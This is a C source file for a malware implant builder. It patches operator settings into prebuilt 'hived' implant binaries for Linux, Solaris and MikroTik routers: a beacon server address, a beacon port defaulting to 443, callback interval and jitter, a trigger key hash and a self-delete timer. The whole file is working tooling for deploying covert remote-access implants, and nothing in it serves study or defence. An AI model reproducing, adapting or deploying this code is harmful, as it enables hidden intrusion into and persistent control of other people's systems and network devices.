#include <stdio.h>
#include <unistd.h>
#include <getopt.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <trigger_protocols.h>
#include "_unpatched_solaris_sparc.h"
#include "_unpatched_solaris_i386.h"
#include "_unpatched_linux_i386.h"
#include "_unpatched_mikrotik_i386.h"
#include "_unpatched_mikrotik_mipsbe.h"
#include "_unpatched_mikrotik_mipsle.h"
#include "_unpatched_mikrotik_ppc.h"

#include "debug.h"
#include "string_utils.h"
#include "colors.h"

//PolarSSL Files
#include "./ssl/polarssl/include/polarssl/config.h"
#include "./ssl/polarssl/include/polarssl/sha1.h"

#define HIVE_SOLARIS_SPARC_FILE "hived-solaris-sparc-PATCHED"
#define HIVE_SOLARIS_I386_FILE "hived-solaris-i386-PATCHED"
#define HIVE_LINUX_I386_FILE "hived-linux-i386-PATCHED"
#define HIVE_MIKROTIK_I386_FILE "hived-mikrotik-i386-PATCHED"
#define HIVE_MIKROTIK_MIPSBE_FILE "hived-mikrotik-mipsbe-PATCHED"
#define HIVE_MIKROTIK_MIPSLE_FILE "hived-mikrotik-mipsle-PATCHED"
#define HIVE_MIKROTIK_PPC_FILE "hived-mikrotik-ppc-PATCHED"

#define HIVE_SOLARIS_SPARC_UNPATCHED "hived-solaris-sparc-UNpatched"
#define HIVE_SOLARIS_I386_UNPATCHED "hived-solaris-i386-UNpatched"
#define HIVE_LINUX_I386_UNPATCHED "hived-linux-i386-UNpatched"
#define HIVE_MIKROTIK_I386_UNPATCHED "hived-mikrotik-i386-UNpatched"
#define HIVE_MIKROTIK_MIPSBE_UNPATCHED "hived-mikrotik-mipsbe-UNpatched"
#define HIVE_MIKROTIK_MIPSLE_UNPATCHED "hived-mikrotik-mipsle-UNpatched"
#define HIVE_MIKROTIK_PPC_UNPATCHED "hived-mikrotik-ppc-UNpatched"

#define CREAT_MODE	S_IRUSR | S_IWUSR | S_IXUSR | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH

//********************************************************************************
//rsa_context		rsa;
struct cl_args
{
	unsigned int    sig;
	unsigned int    beacon_port;
	unsigned int	host_len;
	char            beacon_ip[256];
	char            iface[16];
	unsigned char   idKey[20];
	unsigned long   init_delay;
	unsigned int    interval;
	unsigned int	trigger_delay;
	unsigned int	jitter;
	time_t  	delete_delay;
	unsigned int    patched;
} __attribute__((packed));

#define SIG_HEAD    0x7AD8CFB6

struct cl_args     args = { SIG_HEAD, 0,  0, {0}, {0}, {0}, 0, 0, 0, 0, 0, 0 };

#define DEFAULT_INITIAL_DELAY		3 * 60 * 1000		// 3 minutes
#define DEFAULT_BEACON_PORT		443			// TCP port 443 (HTTPS)
#define DEFAULT_BEACON_INTERVAL		0			// operators did not want a default value
#define DEFAULT_TRIGGER_DELAY		60 * 1000		// 60 seconds
#define DEFAULT_BEACON_JITTER		3                       // Default value is 3, range is from 0<=jitter<=30
#define DEFAULT_SELF_DELETE_DELAY	60 * 24 * 60 * 60 	// Default value is 60 days...

#ifdef DEBUG
//define displaySha1Hash function
void displaySha1Hash(char *label, unsigned char *sha1Hash)
{
	int i=0;

	//Display Label
	printf( " DEBUG: %s=[", label );

	//Display 40 hexadecimal number array
	for (i=0; i < ID_KEY_HASH_SIZE; i++)
		printf("%02x",sha1Hash[i]);
	printf( "]\n" );
}
#endif

//********************************************************************************
int user_instructions( void );
//int local_gen_keys( char *pubkeyfile, char *privkeyfile, int keySz );
int patch( char *filename, unsigned char *hexarray, unsigned int arraylen, struct cl_args patched_args );
int non_patch( char *filename, unsigned char *hexarray, unsigned int arraylen );

//********************************************************************************
int usage( char **argv )
{
	printf( "\n" );
   fprintf(stdout, "  %sUsage:%s\n", BLUE, RESET );
   fprintf(stdout, "  %s [-a address] [-d b_delay] [-i interval] [-k idKey] [-I interface] [-p port] [-t t_delay] [-m OS] \n\n", *argv );
   fprintf(stdout, "    %s[-a address]%s   - IP address or hostname of beacon server\n", GREEN, RESET );
   fprintf(stdout, "    %s[-d b_delay]%s   - initial delay before first beacon (in seconds), 0 for no beacons.\n", GREEN, RESET );
   fprintf(stdout, "    %s[-i interval]%s  - beacon interval (in seconds)\n", GREEN, RESET );
   fprintf(stdout, "    %s[-k idKeyPhrase]%s  - idKey Phrase (maximum 100 Character Sequence with no spaces)\n", GREEN, RESET );
   fprintf(stdout, "    %s[-j b_jitter]%s   - beacon jitter (integer of percent variance between 0 and 30 [0-30] )\n", GREEN,RESET);
   fprintf(stdout, "    %s[-I interface]%s - Solaris Only - interface to listen for triggers\n", GREEN, RESET );
   fprintf(stdout, "    %s[-p port]%s      - (optional) beacon port [default: 443]\n", GREEN, RESET );
   fprintf(stdout, "    %s[-s sd_delay]%s   - (optional) self delete delay since last successful trigger/beacon (in seconds) [default: 60 days]\n", GREEN, RESET);
   fprintf(stdout, "    %s[-t t_delay]%s   - (optional) delay between trigger received & callback +/- 30 sec (in seconds) [default: 60 sec]\n", GREEN, RESET);
   fprintf(stdout, "    %s[-m OS]%s        - (optional) target OS [default: 'all'].  options:\n", GREEN, RESET );
   fprintf(stdout, "                         * 'all' - default\n" );
   fprintf(stdout, "                         * 'raw' - all unpatched\n" );
   fprintf(stdout, "                         * 'win'\n" );
   fprintf(stdout, "                         * 'mt-x86'\n" );
   fprintf(stdout, "                         * 'mt-mipsbe'\n" );
   fprintf(stdout, "                         * 'mt-mipsle'\n" );
   fprintf(stdout, "                         * 'mt-ppc'\n" );
   fprintf(stdout, "                         * 'linux-x86'\n" );
   fprintf(stdout, "                         * 'sol-x86'\n" );
   fprintf(stdout, "                         * 'sol-sparc'\n" );
   fprintf(stdout, "    %s[-h ]%s          - print this usage\n\n", GREEN, RESET );
//   fprintf(stdout, "  %sExamples:%s\n", BLUE, RESET);
//   fprintf( stdout, "   Coming soon!\n\n" );
	printf( "\n" );
	return 0;
}
//********************************************************************************
int RandFill( char *buf, int size )
{
	int			i;
	static int	srand_set;

	if ( srand_set != 1 )
	{
		srand( time( NULL ) );
		srand_set = 1;
	}

	for ( i = 0; i < size; i++ )
	{
		buf[i] = (char)(rand() % 255);
	}

	return 0;
}

//********************************************************************************
int main( int argc, char **argv )
{
	int				optval;
	//struct in_addr	addr_check;
	int				linux_x86 = 0;		// Linux x86
	int				solaris_sparc = 0;	// Solaris SPARC
	int				solaris_x86 = 0;	// Solaris x86
	int				mikrotik_x86 = 0;	// MikroTik x86
	int				mikrotik_mipsbe = 0;	// MikroTik MIPS Big Endian
	int				mikrotik_mipsle = 0;	// MikroTik MIPS Little Endian
	int				mikrotik_ppc = 0;	// MikroTik PowerPC [Big Endian]
	int				raw = 0; 		// unpatched versions
	char				*host = (char *)NULL;	// cached hostname for user confirmation message
	FILE				*implantIDFile;         //Used to save implant keys and subsequent sha1 hashes...
	unsigned char                   tempSha1Hash[20];       //Used to determine sha1 Hash key
	unsigned char                   idKey[20];              //Sha1 Hash of keyphrase's sha1 hash
	int 				hashIndex;

	args.patched = 1;
	args.init_delay = DEFAULT_INITIAL_DELAY;
	args.beacon_port = DEFAULT_BEACON_PORT;
	args.interval = DEFAULT_BEACON_INTERVAL;
	args.trigger_delay = DEFAULT_TRIGGER_DELAY;
        args.delete_delay = DEFAULT_SELF_DELETE_DELAY;
	args.jitter = DEFAULT_BEACON_JITTER;
	args.host_len = 0;

    while ( ( optval = getopt(argc, argv, "+m:a:p:i:I:k:d:t:s:j:h")) != -1 )
    {
        switch( optval )
        {
			// operating system: valid linux, solaris, all, or raw
            case 'm':
        	    	    	if ( strncmp( optarg, "mt-p", 4 ) == 0 )
				{
					// mikrotik powerpc
					mikrotik_ppc = 1;
				}
				else if ( strncmp( optarg, "mt-mipsb", 8 ) == 0 )
				{
					// mikrotik MIPS big endian
					mikrotik_mipsbe = 1;
				}
				else if ( strncmp( optarg, "mt-mipsl", 8 ) == 0 )
				{
					// mikrotik MIPS little endian
					mikrotik_mipsle = 1;
				}
				else if ( strncmp( optarg, "mt-x", 4 ) == 0 )
				{
					// mikrotik x86
					mikrotik_x86 = 1;
				}
				else if ( strncmp( optarg, "sol-x", 5 ) == 0 )
				{
					// solaris x86
					solaris_x86 = 1;
				}
				else if ( strncmp( optarg, "sol-s", 5 ) == 0 )
				{
					// solaris sparc
					solaris_sparc = 1;
				}
				else if ( strncmp( optarg, "l", 1 ) == 0 )
				{
					// linux
					linux_x86 = 1;
				}
				else if ( strncmp( optarg, "a", 1 ) == 0 )
				{
					solaris_sparc = 1;
					linux_x86 = 1;
					solaris_x86 = 1;
					mikrotik_x86 = 1;
					mikrotik_mipsbe = 1;
					mikrotik_mipsle = 1;
					mikrotik_ppc = 1;
				}
				else if ( strncmp( optarg, "r", 1 ) == 0 )
				{
					// all
					raw = 1;
				}
				else
				{
					// error
					printf( " ERROR: unspecified error\n" );
					return -1;
				}
				
                break;

			// beacon port
			case 'p':
				args.beacon_port = (unsigned int)atoi( optarg );
				break;
	
			// initial delay
			case 'd':
				args.init_delay = strtoul( optarg, NULL, 10 ) * 1000;
				break;
	
			// self delete delay
			case 's':
				args.delete_delay = strtoul( optarg, NULL, 10 );
				break;
	
			// trigger delay
			case 't':
				args.trigger_delay = (unsigned int)atoi( optarg ) * 1000;
				break;
	
			// Hostname / IP address of beacon LP
			case 'a':
				if ( strlen( optarg ) > sizeof( args.beacon_ip ) )
				{
					printf( " ERROR: Hostname or IP exceeds %d character limit\n", sizeof( args.beacon_ip ) ); 
					return -1;
				}

/*
                if ( inet_aton( optarg, &addr_check ) == 0 )
                {
                    printf( " ERROR: invalid IP address specified\n" );
                    return -1;
                }
*/	

				// save pointer to the unmodified user input.  this is echo'd back to user
				host = optarg;

				// fill/initialize structure with random data
				RandFill( args.beacon_ip, sizeof( args.beacon_ip ) );

				args.host_len = strlen( optarg );
				memcpy( args.beacon_ip, optarg, strlen( optarg ) );

				// copy string representation of hostname or IP into the structure
				memcpy( args.beacon_ip, optarg, args.host_len );

				break;

	
			// ID Key Phrase used for sha1 hash that is stored in idKey 
			case 'k':
				if ( strlen( optarg ) < 8 ) 
				{
					printf( " ERROR: Insufficient length for keyPhrase entered, must be greater than 7 characters limit\n" ); 
					return -1;
				}

				sha1( (const unsigned char*) optarg, strlen(optarg), tempSha1Hash);    //Compute sha1 hash of keyPhrase and save as tempSha1Hash
										//  This is what the trigger packet will send...

				sha1( (const unsigned char*) tempSha1Hash, ID_KEY_HASH_SIZE * sizeof(unsigned char), idKey);                 //idKey contains the final sha1 hash
										// which is the implant's id key.  This will be 
										// compared with the sha1 of the trigger packets sent
										// sha1 hash [tempSha1Hash]
				D(displaySha1Hash("tempSha1Hash", tempSha1Hash););
				D(displaySha1Hash("idKey", idKey););
				memcpy( args.idKey, idKey, ID_KEY_HASH_SIZE * sizeof(unsigned char));
	
				// Save the implant's id key.
				implantIDFile=fopen("idKeys.txt", "a+");        //Used to save implant keys and subsequent sha1 hashes...
				if ( implantIDFile != NULL)
				{
					fprintf( implantIDFile, "%s \t ", optarg );
					for (hashIndex=0; hashIndex<20; hashIndex++)
					{
						fprintf(implantIDFile, "%02x", tempSha1Hash[hashIndex]);
					}
					fprintf( implantIDFile, " \t " );
					for (hashIndex=0; hashIndex<20; hashIndex++)
					{
						fprintf(implantIDFile, "%02x", idKey[hashIndex]);
					}
					fprintf( implantIDFile, " \n" );
				}
				else
				{
					printf( "Unable to save implantID information into the idKeys.txt file.\n" );
					return -1;
				}
				fclose(implantIDFile);
				
				break;

			// beacon interval
			case 'i':
				args.interval = (unsigned int)atoi( optarg ) * 1000;
				break;

			// interface to listen for triggers. only needed for solaris
			case 'I':
				if ( strlen( optarg ) > sizeof( args.iface ) )
				{
					printf( " ERROR: Name of interface is too long\n" ); 
					return -1;
				}

				// copy string representation of interface name into patched structure
				memcpy( args.iface, optarg, strlen( optarg ) );

				break;

			case 'j':
				args.jitter = (unsigned int)atoi(optarg);
				break;

			default:
				printf( " ERROR: Invalid option or option requires a parameter\n" ); 
				return -1;
				break;
		}
	}

	if ( raw == 0 )
	{
		if ( ( args.beacon_port == 0 ) || ( args.interval == 0 ) || ( strlen( args.beacon_ip ) == 0 ) )
		{
			printf( "\n" );
			printf( "    %sERROR: Incomplete options%s\n", RED, RESET );
			usage( argv );
			return -1;	
		} 

		//Enforce 0<=jitter<=30 jitter requirement.
		if ( ( (int) args.jitter < 0) || ( args.jitter > 30 ) )
		{
			printf( "\n");
			printf("    %sError: Incorrect options%s\n", RED, RESET);
			usage(argv);
			return -1;
		}

		if ( ( linux_x86 == 0 ) && ( solaris_sparc == 0 ) && ( solaris_x86 == 0 ) && ( mikrotik_x86 == 0 ) && ( mikrotik_mipsbe == 0 ) && ( mikrotik_ppc == 0 ) && ( mikrotik_mipsle == 0 ) )
		{	// no OS was selected, so default is to build all
			solaris_sparc = 1;
			linux_x86 = 1;
			solaris_x86 = 1;
			mikrotik_x86 = 1;
			mikrotik_mipsbe = 1;
			mikrotik_mipsle = 1;
			mikrotik_ppc = 1;
		}

		if ( ( solaris_sparc == 1 ) || ( solaris_x86 == 1 ) )
		{	// Solaris must have the interface patched in
			if ( strlen( args.iface ) == 0 )
			{ 
				printf( "\n" );
				printf( "    ERROR: Incomplete options. %sSolaris%s requires an interface be selected.\n", RED, RESET );
				usage( argv );
				return -1;	
			}
		}
	
		printf( "\n" );
		printf( "  This application will generate PATCHED files with the following values:\n" );
		printf( "   . Beacon Server IP address    -> %s\n", host );
		printf( "   . Beacon Server Port number   -> %d\n", args.beacon_port );

		printf( "   . Implant ID Key              -> ");
		for (hashIndex=0; hashIndex<20; hashIndex++)
		{
			printf("%02x", args.idKey[hashIndex]);
		}
		printf( "\n" );

		printf( "   . Beacon Initial Delay        -> %lu (sec)\n", args.init_delay/1000 );
		printf( "   . Beacon Interval             -> %d (sec)\n", args.interval/1000 );
		printf( "   . Beacon Jitter               -> %d (percentage)\n", args.jitter );              //Added jitter display
		printf( "   . Self Delete Delay           -> %lu (sec)\n", args.delete_delay );
		printf( "   . Trigger Delay               -> %d +/- 30 (sec)\n", args.trigger_delay/1000 );
	}

	if ( solaris_sparc == 1  || solaris_x86 == 1 )
	{
		printf( "   . Listening Interface         -> %s     (Solaris Only)\n", args.iface );
	}

	printf( "\n" );
	printf( "  Target Operating Systems:\n" );

	// little endian systems targets

	if ( linux_x86 == 1 || raw == 1 )
	{
		printf( "   . Linux/x86\n" );
	}

	if ( solaris_sparc == 1 || raw == 1 )
	{
		printf( "   . Solaris/SPARC\n" );
	}

	if ( solaris_x86 == 1 || raw == 1 )
	{
		printf( "   . Solaris/x86\n" );
	}

	if ( mikrotik_x86 == 1 || raw == 1 )
	{
		printf( "   . MikroTik/x86\n" );
	}

	if ( mikrotik_mipsle == 1 || raw == 1 )
	{
		printf( "   . MikroTik/MIPS-LE\n" );
	}

	// beginning of big endian targets

	if ( mikrotik_mipsbe == 1 || raw == 1 )
	{
		printf( "   . MikroTik/MIPS-BE\n" );
	}

	if ( mikrotik_ppc == 1 || raw == 1 )
	{
		printf( "   . MikroTik/PPC\n" );
	}

	if ( raw == 0 )
	{
		cl_string( (unsigned char *)args.beacon_ip, sizeof( args.beacon_ip ) );
		cl_string( (unsigned char *)args.iface, sizeof( args.iface ) );
	}

	remove( HIVE_SOLARIS_SPARC_FILE );
	remove( HIVE_SOLARIS_I386_FILE );
	remove( HIVE_LINUX_I386_FILE );
	remove( HIVE_MIKROTIK_I386_FILE );
	remove( HIVE_MIKROTIK_MIPSBE_FILE );
	remove( HIVE_MIKROTIK_MIPSLE_FILE );
	remove( HIVE_MIKROTIK_PPC_FILE );

	remove( HIVE_SOLARIS_SPARC_UNPATCHED );
	remove( HIVE_SOLARIS_I386_UNPATCHED );
	remove( HIVE_LINUX_I386_UNPATCHED );
	remove( HIVE_MIKROTIK_I386_UNPATCHED );
	remove( HIVE_MIKROTIK_MIPSBE_UNPATCHED );
	remove( HIVE_MIKROTIK_MIPSLE_UNPATCHED );
	remove( HIVE_MIKROTIK_PPC_UNPATCHED );


	sleep( 1 );

//    local_gen_keys( PUBKEYFILE, PRIVKEYFILE, KEY_SIZE );

	if ( raw == 1 )
	{
		printf( "\n" );
		non_patch( HIVE_LINUX_I386_UNPATCHED, hived_linux_i386_unpatched, hived_linux_i386_unpatched_len );
		non_patch( HIVE_SOLARIS_SPARC_UNPATCHED, hived_solaris_sparc_unpatched, hived_solaris_sparc_unpatched_len );
		non_patch( HIVE_SOLARIS_I386_UNPATCHED, hived_solaris_i386_unpatched, hived_solaris_i386_unpatched_len );
		non_patch( HIVE_MIKROTIK_I386_UNPATCHED, hived_mikrotik_i386_unpatched, hived_mikrotik_i386_unpatched_len );
		non_patch( HIVE_MIKROTIK_MIPSLE_UNPATCHED, hived_mikrotik_mipsle_unpatched, hived_mikrotik_mipsle_unpatched_len );
		non_patch( HIVE_MIKROTIK_MIPSBE_UNPATCHED, hived_mikrotik_mipsbe_unpatched, hived_mikrotik_mipsbe_unpatched_len );
		non_patch( HIVE_MIKROTIK_PPC_UNPATCHED, hived_mikrotik_ppc_unpatched, hived_mikrotik_ppc_unpatched_len );
	}

// We start as Little Endian.  If the binary is detected as Big Endian, then the structure
// is changed to Big Endian.  Since these changes are made in a global variable used by all
// parsers, check for Little Endian variants first and the Big Endian possibilities next.

	if ( linux_x86 == 1 )
	{
		patch( HIVE_LINUX_I386_FILE, hived_linux_i386_unpatched, hived_linux_i386_unpatched_len, args );
	}

	if ( solaris_x86 == 1 )
	{
		patch( HIVE_SOLARIS_I386_FILE, hived_solaris_i386_unpatched, hived_solaris_i386_unpatched_len, args );
	}

	if ( mikrotik_x86 == 1 )
	{
		patch( HIVE_MIKROTIK_I386_FILE, hived_mikrotik_i386_unpatched, hived_mikrotik_i386_unpatched_len, args );
	}

	if ( mikrotik_mipsle == 1 )
	{
		patch( HIVE_MIKROTIK_MIPSLE_FILE, hived_mikrotik_mipsle_unpatched, hived_mikrotik_mipsle_unpatched_len, args );
	}

	if ( mikrotik_ppc == 1 )
	{
		patch( HIVE_MIKROTIK_PPC_FILE, hived_mikrotik_ppc_unpatched, hived_mikrotik_ppc_unpatched_len, args );
	}

	if ( mikrotik_mipsbe == 1 )
	{
		patch( HIVE_MIKROTIK_MIPSBE_FILE, hived_mikrotik_mipsbe_unpatched, hived_mikrotik_mipsbe_unpatched_len, args );
	}

// beginning of big endian targets
	if ( solaris_sparc == 1 )
	{
		patch( HIVE_SOLARIS_SPARC_FILE, hived_solaris_sparc_unpatched, hived_solaris_sparc_unpatched_len, args );
	}

	printf( "\n" );
	return 0;
}

//********************************************************************************
int non_patch( char *filename, unsigned char *hexarray, unsigned int arraylen )
{
	int		fd, ret;

	printf( "  Generating %s file...", filename );

	fd = creat( filename, CREAT_MODE );
	if ( fd < 0 )
	{
		perror( "creat" );
		exit( -1 );
	}

	ret = write( fd, hexarray, arraylen );

	if ( (unsigned int)ret != arraylen )
	{
		printf( "FAILED\n  Writing Server incomplete.  Aborting.\n\n" );
		exit( -1 );
	}

	close( fd );

	printf( " ok\n" );

	return 0;
}
//********************************************************************************
int patch( char *filename, unsigned char *hexarray, unsigned int arraylen, struct cl_args patched_args )
{
	unsigned int	sig_head = SIG_HEAD;
	uint32_t		sig_head2 = ntohl( SIG_HEAD );
	unsigned char	*p; //, keybuffer[128];
	int				fd, ret = 1;
	unsigned int	cnt = 0;
	int				big_endian = 0;
	struct cl_args	copy_of_args = patched_args;


	printf( "  \n" );

	p = hexarray;
	cnt = 0;
	do
	{
		if ( cnt > arraylen )
		{
			printf( "\n  Patch signature not found in %s.  Aborting.\n\n", filename );
			exit( 0 );
			break;
		}

		// try #1 LITTLE ENDIAN
		// TODO: once the first big endian target is found and the structure is swapped to 
		// big endian, I think all successive BIG ENDIAN targets are actually matching 
		// against the LITTLE ENDIAN rules.  it works, but could be problematic in the future
		ret = memcmp( (unsigned int *)p, &sig_head, sizeof( SIG_HEAD ) );

		// try #2 BIG ENDIAN
		if ( ret != 0 )
		{
			ret = memcmp( (unsigned int *)p, &sig_head2, sizeof( SIG_HEAD ) );
			if ( ret == 0 ) big_endian = 1;
		}
		
		p++; cnt++;
	} while ( ret != 0 );

	p--;
	printf( "  SIG_HEAD found at offset %08X for %s\n", ( p - hexarray ), filename );
	
//	memcpy( p + sizeof( SIG_HEAD ), keybuffer, 128 );
	if ( big_endian == 0 )
	{
		memcpy( p, &copy_of_args, sizeof( struct cl_args ) );
	}
	else if ( big_endian == 1 )
	{
		copy_of_args.sig = htonl( copy_of_args.sig );
		copy_of_args.beacon_port = htonl( copy_of_args.beacon_port );
		copy_of_args.host_len = htonl( copy_of_args.host_len );

		//How do I convert array of sha1 hash into network byte order for different endian type of machines...
		memcpy( copy_of_args.idKey, copy_of_args.idKey, 20*sizeof(unsigned char));
		//copy_of_args.idKey = htonl( &copy_of_args.idKey );

		copy_of_args.init_delay = htonl( copy_of_args.init_delay );
		copy_of_args.interval = htonl( copy_of_args.interval );
		copy_of_args.jitter = htonl( copy_of_args.jitter );
		copy_of_args.trigger_delay = htonl( copy_of_args.trigger_delay );
		copy_of_args.delete_delay = htonl( copy_of_args.delete_delay );
		copy_of_args.patched = htonl( copy_of_args.patched );

		memcpy( p, &copy_of_args, sizeof( struct cl_args ) );
	}

	/* write out the patched file */
	printf( "  Generating %s file...", filename );

	fd = creat( filename, CREAT_MODE );
	if ( fd < 0 )
	{
		perror( "creat" );
		exit( -1 );
	}

	ret = write( fd, hexarray, arraylen );

	if ( (unsigned int)ret != arraylen )
	{
		printf( "FAILED\n  Writing Server incomplete.  Aborting.\n\n" );
		exit( -1 );
	}

	close( fd );

	printf( " ok\n" );

	return 0;
}

//********************************************************************************
//********************************************************************************
#if 0
int local_gen_keys( char *pubkeyfile, char *privkeyfile, int keySz )
{
	int				ret;
	havege_state	hs;
	FILE			*fpub = NULL, *fpriv = NULL;
	
	printf( "\n Seeding the random number generator..." );
	fflush( stdout );

	havege_init( &hs );
	printf( "ok\n  . Generating RSA key [ %d-bit ]...", keySz );
	fflush( stdout );
	
	if ( ( ret = rsa_gen_key( &rsa, keySz, PUB_EXPONENT, havege_rand, &hs ) ) != 0 )
	{
		printf( " failed\n  ! rsa_gen_key returned %08x\n\n", ret );
		goto exit;
	}

	printf( " ok\n  . Exporting the public key...." );
    fflush( stdout );

    if( ( fpub = fopen( pubkeyfile, "wb+" ) ) == NULL )
    {
        printf( " failed\n  ! could not open public key file for writing\n\n" );
        ret = -1;
        goto exit;
    }

    if( ( ret = rsa_write_public( &rsa, fpub ) ) != 0 )
    {
        printf( " failed\n  ! rsa_write_public returned %08x\n\n", ret );
        goto exit;
    }

    printf( " ok\n  . Exporting the private key..." );
    fflush( stdout );

    if( ( fpriv = fopen( privkeyfile, "wb+" ) ) == NULL )
    {
        printf( " failed\n  ! could not open private key file for writing\n" );
        ret = -1;
        goto exit;
    }

    if( ( ret = rsa_write_private( &rsa, fpriv ) ) != 0 )
    {
        printf( " failed\n  ! rsa_write_private returned %08x\n\n", ret );
        goto exit;
    }

    printf( " ok\n" );
	ret = 0;

exit:
    if( fpub  != NULL )
        fclose( fpub );

    if( fpriv != NULL )
        fclose( fpriv );

//    rsa_free( &rsa );

	return( ret );
}
#endif
